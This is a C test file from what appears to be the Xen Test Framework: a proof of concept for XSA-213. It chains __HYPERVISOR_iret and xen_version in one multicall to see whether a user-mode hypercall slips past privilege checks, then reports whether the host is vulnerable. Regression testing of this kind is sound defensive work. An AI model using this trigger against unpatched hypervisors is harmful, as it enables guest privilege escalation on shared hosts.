/**
 * @file tests/xsa-213/main.c
 * @ref test-xsa-213
 *
 * @page test-xsa-213 XSA-213
 *
 * Advisory: [XSA-213](http://xenbits.xen.org/xsa/advisory-213.html)
 *
 * Before XSA-213, Xen would allow the use of __HYPERCALL_iret in a multicall.
 * __HYPERCALL_iret switches the guest from kernel mode into user mode, but
 * the multicall continues irrespective, with no further privilege checks.
 *
 * Some hypercalls expect on being run in kernel mode, and their reference
 * counting depends on this.  It has never been expecting for user code to
 * execute hypercalls, so the fix is to terminate the multicall once an iret
 * has been encountered.
 *
 * This PoC mixes an iret and xen_version hypercall in a multicall, to check
 * whether the multicall terminates before executing the xen_version part.
 *
 * @see tests/xsa-213/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-213 PoC";

#define IRET_IDENTIFIER 0xdead

/* IDT handler to recover from arriving at iret_entry. */
void recover_from_iret(void);
asm(".align 16;"
    "recover_from_iret:"
    "mov %dr0, %" _ASM_SP ";"
    "jmp multicall_return;"
    );

/* Target of the __HYPERVISOR_iret hypercall. */
void iret_entry(void);
asm (".pushsection .text.user;"
     ".global iret_entry;"
     "iret_entry:"
     "int $" STR(X86_VEC_AVAIL) ";"
     ".popsection;"
    );

static long multi_iret_call(multicall_entry_t *multi, size_t nr)
{
    long rc, tmp;

    asm volatile (/* Stash the stack pointer for recover_from_iret() */
                  "mov %%" _ASM_SP ", %%dr0;"

                  /*
                   * Build a __HYPERVISOR_iret stack frame, on the user_stack,
                   * landing at iret_entry().  The interrupt flag leaks in
                   * from real hardware, and needs clobbering.
                   */
                  "push $%c[ss];"
                  "push $user_stack + 4096;"
                  "pushf;"
                  "andl $~%c[intr], (%%" _ASM_SP ");"
                  "push $%c[cs];"
                  "push $iret_entry;"

#ifdef __x86_64__ /* 64bit SYSEXIT flags, %rcx and %r11.  Ignored. */
                  "push $0;"
                  "push $0;"
                  "push $0;"
#endif
                  /* %rax to restore after __HYPERVISOR_iret. */
                  "push $ " STR(IRET_IDENTIFIER) ";"

#ifdef __i386__   /* Start the __HYPERVISOR_multicall. */
                  "int $0x82;"
#else
                  "syscall;"
#endif
                  /* Recovery point from recover_from_iret(). */
                  "multicall_return:"

                  : "=a" (rc),
#ifdef __i386__
                    "=b" (tmp), "=c" (tmp)
#else
                    "=D" (tmp), "=S" (tmp)
#endif
                  : "a" (__HYPERVISOR_multicall),
                    [ss] "i" (__USER_DS),
                    [cs] "i" (__USER_CS),
                    [intr] "i" (X86_EFLAGS_IF),
#ifdef __i386__
                    "b" (multi), "c" (nr)
#else
                    "D" (multi), "S" (nr)
#endif
        );

    return rc;
}

static multicall_entry_t multi[] = {
    {
        .op = __HYPERVISOR_iret,
    },
    {
        .op = __HYPERVISOR_xen_version,
        .args = {
            (unsigned long)XENVER_version,
            (unsigned long)NULL,
        },
    },
};

static struct xtf_idte idte =
{
    .addr = (unsigned long)recover_from_iret,
    .cs   = __KERN_CS,
    .dpl  = 3,
};

void test_main(void)
{
    long rc, xen_version = hypercall_xen_version(XENVER_version, NULL);

    printk("Found Xen %ld.%ld\n",
           (xen_version >> 16) & 0xffff, xen_version & 0xffff);

    xtf_set_idte(X86_VEC_AVAIL, &idte);

    rc = multi_iret_call(multi, ARRAY_SIZE(multi));

    if ( rc != IRET_IDENTIFIER )
    {
        if ( rc )
            xtf_error("Error: Unexpected multicall result %ld\n", rc);
        else
            xtf_failure("Fail: Multicall didn't finish at the iret\n");
    }

    if ( multi[1].result )
    {
        if ( multi[1].result == (unsigned long)xen_version )
            xtf_failure("Fail: xen_version hypercall run in user context\n");
        else
            xtf_error("Error: Unexpected xen_version result %#lx\n",
                      multi[1].result);
    }
    else
        xtf_success("Success: Not vulnerable to XSA-213\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
